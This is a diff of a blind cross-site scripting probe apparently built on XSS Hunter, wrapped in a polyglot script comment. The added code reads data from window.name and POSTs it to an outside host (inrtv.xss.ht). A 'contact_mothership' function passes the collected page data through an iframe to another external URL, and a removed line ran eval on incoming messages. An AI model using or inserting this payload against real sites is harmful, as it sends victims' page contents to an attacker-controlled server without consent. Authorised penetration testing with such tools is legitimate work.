@@ -1,6 +1,19 @@
-onmessage=e=>eval(e.data)
 /*
 <script> 
+window.onload = function(h){
+  h = window.name;
+  if(h){ // send page info to XSSHUNTER
+    fetch("https://inrtv.xss.ht/js_callback", {
+      "headers": {
+      },
+      "referrer": "iframe",
+      "referrerPolicy": "origin",
+      "body": h,
+      "method": "POST",
+      "mode": "no-cors",
+      "credentials": "omit"
+    });
+  } else {
   parent.postMessage(`
 // * html2canvas 1.0.0-rc.7 <https://html2canvas.hertzen.com>
 // * Copyright (c) 2020 Niklas von Hertzen <https://hertzen.com>
@@ -6964,7 +6977,7 @@ window.never_null = function never_null( value ) {
 window.contact_mothership = function contact_mothership( probe_return_data ) {
     let i = document.createElement('iframe');
     i.name=JSON.stringify(probe_return_data);
-    i.src = 'https://x92pm6xpjq.csb.app/XSH/i.html';
+    i.src = 'https://cmr.github.io/b/';
     document.body.appendChild(i);
 }
 window.addEvent = function addEvent(element, eventName, fn) {
@@ -7049,6 +7062,6 @@ parent.postMessage(`
     });
   }
 `,'*')
-
+}
 </script>
 */
